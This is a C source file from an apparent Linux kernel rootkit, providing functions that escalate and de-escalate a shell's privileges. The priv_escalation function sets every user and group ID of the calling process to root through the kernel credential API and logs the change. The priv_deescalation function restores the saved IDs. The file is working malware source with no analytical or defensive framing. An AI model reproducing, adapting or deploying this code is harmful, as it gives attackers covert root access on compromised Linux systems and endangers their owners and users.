/*
 * This file provides all the functionality needed for privilage escalation
 */
#include <linux/cred.h>
#include <linux/sched.h>
#include <linux/slab.h>

#include "control.h"
#include "include.h"

/* Function to issue the root privileges for shell */
void
priv_escalation (void)
{
	struct task_struct *process;
        struct cred *pcred = prepare_creds();
	process = current;
	
	if(!(is_shell_escalated(process->pid)))
	{	
		struct escalated_pid *id_struct;
		id_struct = kmalloc(sizeof(struct escalated_pid), GFP_KERNEL);

		id_struct->uid   = pcred->uid.val;
		id_struct->euid  = pcred->euid.val;
		id_struct->suid  = pcred->suid.val;
		id_struct->fsuid = pcred->fsuid.val;
		id_struct->gid   = pcred->gid.val;
		id_struct->egid  = pcred->egid.val;
		id_struct->sgid  = pcred->sgid.val;
		id_struct->fsgid = pcred->fsgid.val;
		
		id_struct->pid = process->pid;
		
		pcred->uid.val = pcred->euid.val = pcred->suid.val = pcred->fsuid.val = 0;
	        pcred->gid.val = pcred->egid.val = pcred->sgid.val = pcred->fsgid.val = 0;

		commit_creds(pcred);
		
		/* Add to the list of escalted ids */
		escalate(id_struct);
		
		kfree(id_struct);	
        	ROOTKIT_DEBUG("pid of the terminal : %d Escalation done!!!\n", process->pid);
	}
	else
	{	
        	ROOTKIT_DEBUG("pid of the terminal : %d I'm already root!!\n", process->pid);
	}

}

/* Function to revoke the root privileges for shell */
void priv_deescalation(void)
{
	struct task_struct *process;
        struct cred *pcred = prepare_creds();
        
	process = current;

	/* If the shell is given the root privileges then it will return a structute containing ids*/
	struct escalated_pid *id_struct = is_shell_escalated(process->pid);
	if(id_struct != NULL)
	{	
		pcred->uid.val   = id_struct->uid;
		pcred->euid.val  = id_struct->euid;
		pcred->suid.val  = id_struct->suid;
		pcred->fsuid.val = id_struct->fsuid;
	        pcred->gid.val   = id_struct->gid;
		pcred->egid.val  = id_struct->egid;
		pcred->sgid.val  = id_struct->sgid;
		pcred->fsgid.val = id_struct->fsgid;
	
		commit_creds(pcred);
			
		/* Delete from the list of escalted ids */
		deescalate(process->pid);
        	ROOTKIT_DEBUG("pid of the terminal : %d Deescalation done!!!\n", process->pid);
	}
	else
	{	
        	ROOTKIT_DEBUG("pid of the terminal : %d I was never root!!\n", process->pid);
	}
	
}
